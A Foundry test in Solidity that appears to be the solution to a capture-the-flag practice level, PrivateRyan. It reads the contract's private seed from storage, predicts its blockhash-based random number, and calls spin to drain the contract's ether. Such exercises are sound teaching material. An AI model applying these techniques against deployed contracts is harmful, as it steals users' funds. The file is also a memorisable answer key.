// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        bytes32 seedBytes = vm.load(address(instance), bytes32(uint256(0)));
        uint256 seedValue = uint256(seedBytes);

        if (block.number <= seedValue) {
            vm.roll(seedValue + 1);
        }

        uint256 targetBlockNumber = block.number - seedValue;

        if (block.number - targetBlockNumber >= 256) {
            uint256 blocksToAdvance = (block.number - targetBlockNumber) - 255;
            vm.roll(block.number + blocksToAdvance);
            targetBlockNumber = block.number - seedValue;
        }

        bytes32 hashVal = blockhash(targetBlockNumber);

        while (hashVal == bytes32(0)) {
            vm.roll(block.number + 1);
            targetBlockNumber = block.number - seedValue;
            hashVal = blockhash(targetBlockNumber);
        }

        uint256 FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
        uint256 max = 100;
        uint256 factor = (FACTOR * 100) / max;
        uint256 num = (uint256(hashVal) / factor) % max;

        instance.spin{value: 0.01 ether}(num);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
